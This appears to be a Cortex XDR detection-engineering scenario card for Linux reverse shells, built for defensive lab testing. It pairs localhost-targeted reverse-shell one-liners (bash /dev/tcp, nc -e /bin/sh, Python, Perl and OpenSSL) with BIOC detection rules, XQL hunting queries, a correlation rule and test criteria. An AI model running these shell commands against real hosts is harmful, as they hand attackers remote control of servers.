identity.name: Linux Reverse Shell — Multi-Method C2 Callback (T1059.004)
identity.summary: A web service account spawns interactive shells that redirect stdio over a socket using five reverse-shell methods: bash /dev/tcp, a Python socket+subprocess one-liner, netcat -e, a Perl socket one-liner, and OpenSSL s_client. Cortex XDR for Linux flags each interpreter pattern via command-line BIOCs and stitches the multi-method sequence into one C2 incident.
identity.description: Reverse shells are the workhorse C2 primitive on compromised Linux servers — Mirai and its variants drop them after exploiting exposed services, then pivot to crypto-mining or botnet enrollment. This scenario exercises the five canonical Linux reverse-shell methods from a non-interactive service account: bash with /dev/tcp redirection, Python importing socket+subprocess, netcat with the -e shell-exec flag, a Perl Socket one-liner, and OpenSSL s_client for an encrypted channel. The detection approach is command-line behavioral analysis: each method has a distinctive process invocation that a Cortex XDR BIOC matches verbatim, while an analytics layer recognizes an interpreter spawned by a service account performing socket operations. A correlation rule fuses the five attempts from one process lineage into a single high-severity command-and-control incident, demonstrating XSIAM stitching even though every connection in the lab targets localhost.

techniques.name: Command and Scripting Interpreter: Unix Shell

execution.framework_reference_id: T1059.004 — Atomic Test (bash /dev/tcp reverse shell) and related socket one-liners

prerequisites.description: Cortex XDR Linux agent installed and reporting healthy on the target.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i traps

prerequisites.description: Lab environment matching scenario SIM-EDR-002 requirements (interpreters bash/python3/perl/openssl and optionally nc available).

payload.code:
# All connections target localhost — safe by design.
timeout 5 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null
timeout 5 python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3);s.connect(('127.0.0.1',4445));exit()" 2>/dev/null
timeout 5 nc -e /bin/sh 127.0.0.1 4446 2>/dev/null || timeout 5 ncat -e /bin/sh 127.0.0.1 4446 2>/dev/null
timeout 5 perl -e 'use Socket;$i="127.0.0.1";$p=4447;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exit();' 2>/dev/null
timeout 5 openssl s_client -quiet -connect 127.0.0.1:4448 2>/dev/null

expected_artifacts.description: bash spawned with -i and /dev/tcp redirection in its command line.
python3 invoked with inline socket+subprocess code.
perl invoked with inline Socket/connect code.
openssl s_client connecting outbound from a service account.
Outbound TCP connection initiated by an interpreter process.

cleanup.code: echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'

biocs.name: EDR-002 Bash devtcp Reverse Shell Redirection
biocs.description: Bash reverse shell pattern — /dev/tcp redirection detected by XDR Agent behavioral rule. bash -i is launched with its stdio redirected to a /dev/tcp socket.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("bash", "sh")
| filter action_process_image_command_line contains "/dev/tcp/"
| filter action_process_image_command_line contains_any (">&", "0>&1", "0<&")

biocs.name: EDR-002 Interactive Bash From Service Account With Network Redirect
biocs.description: Interactive bash spawned from service account with network redirect — C2 callback pattern. An interactive shell with a socket redirect runs under a non-login service identity.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("bash", "sh")
| filter action_process_image_command_line contains "-i"
| filter action_process_image_command_line contains "/dev/tcp/"
| filter actor_effective_username in ("www-data", "nobody", "node", "apache", "nginx")

biocs.name: EDR-002 Python Socket Subprocess Reverse Shell
biocs.description: Python reverse shell pattern — socket+subprocess import with connect call from service account. python3 -c imports socket and subprocess and calls connect().
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("python", "python3")
| filter action_process_image_command_line contains "socket"
| filter action_process_image_command_line contains_any ("subprocess", "pty", ".connect(")

biocs.name: EDR-002 Netcat Shell Exec Flag Reverse Shell
biocs.description: Netcat with -e flag — classic reverse shell pattern detected by endpoint BIOC rule. nc/ncat is invoked with -e/-c to pipe a shell.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("nc", "ncat", "netcat")
| filter action_process_image_command_line contains_any ("-e /bin/sh", "-e /bin/bash", " -e ", "-c /bin/sh")

biocs.name: EDR-002 Perl Socket Reverse Shell One-Liner
biocs.description: Perl socket-based reverse shell pattern — one-liner execution from service account. perl -e contains Socket/connect/sockaddr_in.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "perl"
| filter action_process_image_command_line contains "Socket"
| filter action_process_image_command_line contains_any ("sockaddr_in", "connect(", "inet_aton")

biocs.name: EDR-002 OpenSSL s_client Encrypted C2 From Service Account
biocs.description: OpenSSL s_client invoked from non-interactive service account — encrypted C2 channel attempt. openssl s_client opens an outbound TLS channel from a service identity.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "openssl"
| filter action_process_image_command_line contains "s_client"
| filter actor_effective_username in ("www-data", "nobody", "node", "apache", "nginx")

xql_queries.name: EDR-002 Analytics Interactive Shell Network Redirect
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("bash", "sh")
| filter action_process_image_command_line contains "/dev/tcp/"
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

xql_queries.name: EDR-002 Analytics Python Socket Ops By Service Account
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("python", "python3")
| filter action_process_image_command_line contains "socket"
| filter actor_effective_username != "root"
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line

xql_queries.name: EDR-002 Analytics Network Utility Shell Flag
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("nc", "ncat", "netcat")
| filter action_process_image_command_line contains "-e"
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line

xql_queries.name: EDR-002 Analytics Multi-Method Reverse Shell Sequence
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("bash", "sh", "python", "python3", "nc", "ncat", "perl", "openssl")
| filter action_process_image_command_line contains_any ("/dev/tcp/", "socket", "-e /bin/", "sockaddr_in", "s_client")
| comp count_distinct(actor_process_image_name) as method_count by agent_hostname, causality_actor_process_instance_id
| filter method_count >= 2

correlation_rules.name: Reverse Shell Multi-Method C2 — Same Lineage
correlation_rules.logic: BIOC(EDR-002 Bash devtcp Reverse Shell Redirection) OR BIOC(EDR-002 Interactive Bash From Service Account With Network Redirect) OR BIOC(EDR-002 Python Socket Subprocess Reverse Shell) OR BIOC(EDR-002 Netcat Shell Exec Flag Reverse Shell) OR BIOC(EDR-002 Perl Socket Reverse Shell One-Liner) OR BIOC(EDR-002 OpenSSL s_client Encrypted C2 From Service Account)

analytics_modules: Cortex XDR Analytics — Service account spawning interpreter with outbound socket
Cortex XDR Behavioral Threat Protection — Reverse shell cluster

products.evidence_query: preset = xdr_data | filter action_process_image_command_line contains "/dev/tcp/" | fields _time, agent_hostname, action_process_image_command_line
Correlation CR-EDR-0002 fuses multi-method reverse-shell attempts from one lineage into a single C2 incident.

use_cases.name: Command and Control Detection — Linux Reverse Shells
use_cases.description: Detect reverse-shell C2 establishment across bash, python, netcat, perl and openssl from a service account, and stitch them into one incident.

test_cases.objective: Each reverse-shell method fires its corresponding Cortex XDR BIOC.
preconditions: Cortex XDR Linux agent >= 8.4.0 installed and healthy.
BIOCs from this card imported and enabled.
steps: Observe BIOC alerts per method in the Cortex console.
success_criteria: BIOC `EDR-002 Bash devtcp Reverse Shell Redirection` fires within 60s.
BIOC `EDR-002 Netcat Shell Exec Flag Reverse Shell` fires when nc is present.
All four XQL validation queries return >= 1 row.

test_cases.objective: Multi-method attempts stitch into a single C2 incident.
success_criteria: Correlation `CR-EDR-0002` groups the methods from one process lineage into one incident.
Incident severity is High or Critical.

preventive_controls: Enable Cortex XDR Behavioral Threat Protection reverse-shell prevention in Block mode on server tiers.
Run application services under least-privilege accounts with no interactive shell.
Restrict egress from server subnets with default-deny firewall policy.
Remove or restrict netcat-traditional, and audit interpreter availability on production hosts.
detection_engineering: Alert on any interpreter command line containing /dev/tcp/, socket+subprocess, nc -e, perl Socket, or openssl s_client from non-root service accounts.
Correlate outbound socket creation with the spawning interpreter process to confirm callback intent.
Hunt for short-lived interpreter processes with network connections to high non-standard ports.
